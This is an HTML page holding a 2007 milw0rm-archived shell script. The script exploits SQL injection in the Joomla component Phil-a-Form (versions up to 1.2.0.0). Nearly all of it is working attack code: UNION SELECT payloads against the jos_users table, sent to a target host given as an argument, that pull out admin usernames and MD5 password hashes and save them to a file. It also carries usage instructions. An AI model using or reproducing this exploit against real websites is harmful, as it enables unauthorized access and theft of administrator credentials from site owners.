<html><head><title>Joomla Component Phil-a-Form <= 1.2.0.0 SQL Injection Exploit</title></head><pre>#!/bin/sh

#################################################################################
#										#
#    Joomla Component Phil-a-Form &lt;= 1.2.0.0 SQL Injection Exploit		#
#										#
# Discovered by: Cody &quot;CypherXero&quot; Rester					#
# Payload: Admin Username and MD5 Hash Retrieval				#
# Website: http://www.cypherxero.net						#
# Shoutouts to the milw0rm community, the PIMP forums				#
# and my blog, of course  	 						#
#										#
#################################################################################

echo &quot;-------------------------------------------------------------------------&quot;
echo &quot;      Joomla Component Phil-a-Form &lt;= 1.2.0.0 SQL Injection Exploit&quot;
echo &quot;-------------------------------------------------------------------------&quot;
echo &quot;Usage: sql_philaform_jos.sh [HOST] [FORM_ID]&quot;
echo &quot;[HOST] = Hostname of targetwebsite&quot;
echo &quot;[FORM_ID] = Form ID of Phil-a-Form post&quot;
echo &quot;e.g. sql_philaform_jos.sh http://www.targethost.com 2&quot;
echo &quot;-------------------------------------------------------------------------&quot;
echo &quot;                           Cody CypherXero Rester&quot;
echo &quot;            		 http://www.cypherxero.net&quot;
echo &quot;-------------------------------------------------------------------------&quot;

jos_username=&quot;%20UNION%20SELECT%20null,null,username,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20jos_users%20--&quot;
jos_password=&quot;%20UNION%20SELECT%20null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20jos_users%20--&quot;
host=&quot;$1&quot;
form_id=&quot;$2&quot;

if [ &quot;$form_id&quot; == &quot;&quot; ]
then
echo &quot;Syntax not correct! See usage example!&quot;
exit 1
else
echo &quot;&quot;
fi

echo &quot;Username&quot; &gt; $host.txt
echo &quot;--------&quot; &gt;&gt; $host.txt
links -dump &quot;http://$host/index.php?option=com_philaform&amp;form_id=$form_id$jos_username&quot; | grep -i &quot;philaform_&quot; | awk -F\_ '{ print $2 }' | awk '{ print $1 }' &gt;&gt; $host.txt
echo &quot; &quot; &gt;&gt; $host.txt
echo &quot;MD5 Password Hash&quot; &gt;&gt; $host.txt
echo &quot;-----------------&quot; &gt;&gt; $host.txt
links -dump &quot;http://$host/index.php?option=com_philaform&amp;form_id=$form_id$jos_password&quot; | grep -i &quot;philaform_&quot; | awk -F\_ '{ print $2 }' | awk '{ print $1 }' &gt;&gt; $host.txt

echo &quot;&quot;
cat $host.txt

exit 0

# milw0rm.com [2007-05-28]</pre></html>